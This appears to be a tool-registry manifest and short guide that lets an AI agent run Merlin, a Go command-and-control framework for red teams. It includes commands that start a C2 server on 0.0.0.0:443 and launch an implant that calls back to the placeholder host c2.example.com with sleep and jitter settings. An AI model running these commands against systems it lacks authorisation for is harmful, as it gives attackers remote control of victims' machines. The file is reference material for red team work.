---
id: security-exploit-merlin
namespace: security:exploit:merlin
name: merlin
description: Cross-platform post-exploitation C2 framework written in Go, supporting HTTP/2, gRPC, and WebSocket communication for agent management.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - agent.communication
  - command.control.c2
  - implant.generation
  - post.exploitation
  - adversary.simulation
platforms:
  - linux
  - macos
  - windows
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - sliver
  - covenant
  - mythic
  - pupy
workflow_edges:
  produces:
    - implant-binary
    - agent-session
    - c2-listener
  consumes:
    - target-ip
    - target-port
    - implant-profile
contract:
  inputs:
    - type: network.target.ip
      description: Server bind address
    - type: network.port.number
      description: Server listen port
    - type: payload.type
      description: Agent type (HTTP2, gRPC, WebSocket)
  outputs:
    - type: agent.session
      description: Agent session
      mime: application/octet-stream
    - type: implant.binary
      description: Generated Go implant binary
      mime: application/octet-stream
  side_effects:
    - network_traffic
    - process_spawn
    - filesystem_write
  resource_cost:
    cpu: medium
    memory_mb: 128
    network: high
    disk_io: low
resource_profile:
  cpu: medium
  memory_mb: 128
  network: high
  disk_io: low
allowed-tools:
  - merlin
  - Bash
  - execFile
parameters:
  - name: flag-i
    type: string
    required: false
    description: "Server bind IP address"
    aliases:
      - -i
      - --ip
  - name: flag-p
    type: integer
    required: false
    description: "Server port"
    aliases:
      - -p
      - --port
  - name: flag-parallel
    type: integer
    required: false
    description: "Number of parallel jobs"
    aliases:
      - -parallel
  - name: flag-verbose
    type: boolean
    required: false
    description: "Enable verbose logging"
    aliases:
      - -v
      - --verbose
  - name: flag-sleep
    type: string
    required: false
    description: "Agent sleep interval (e.g. 10s, 1m)"
    aliases:
      - -s
      - --sleep
  - name: flag-jitter
    type: string
    required: false
    description: "Agent jitter percentage (e.g. 30%%)"
    aliases:
      - -j
      - --jitter
  - name: flag-k
    type: string
    required: false
    description: "Kill date for agent"
    aliases:
      - -k
      - --killdate
  - name: flag-proto
    type: string
    required: false
    description: "Protocol (http2, grpc, ws)"
    aliases:
      - -proto
execution:
  template: "merlin-server {flags}"
  sandbox: execFile
  timeout_seconds: 3600
  shell: false
examples:
  - description: "Start Merlin server on default port"
    command: merlin-server --ip 0.0.0.0 --port 443
  - description: "Start Merlin server with verbose logging"
    command: merlin-server --ip 0.0.0.0 --port 8443 --verbose
  - description: "Generate a Windows agent"
    command: merlin-agent-windows-amd64.exe -s https://c2.example.com:443
references:
  - label: "Merlin GitHub"
    url: "https://github.com/Ne0nd0g/merlin"
phase: exploitation
techniques:
  - command-and-control
  - execution
items:
  - Shell
  - Hash
services: []
attack_types:
  - Exploitation
  - Execution
---

# Merlin — Go-Based C2 Framework

Merlin is a cross-platform post-exploitation C2 framework written in Go, providing HTTP/2, gRPC, and WebSocket-based communication between the server and agents. It supports multiple operating systems and is designed for red team operations.

## Protocol Support

| Protocol | Description |
|----------|-------------|
| HTTP/2 | Encrypted C2 channel over HTTP/2 |
| gRPC | Bi-directional streaming with protocol buffers |
| WebSocket | Real-time full-duplex communication |

## Common Commands

```bash
# Server setup
merlin-server -i 0.0.0.0 -p 443

# Generate agent and deploy
# The agent binary connects back with:
merlin-agent -s https://c2.example.com:443 -sleep 30s -jitter 30%

# Interactive shell from server
# Once agent checks in, use 'interact' to open a session
```
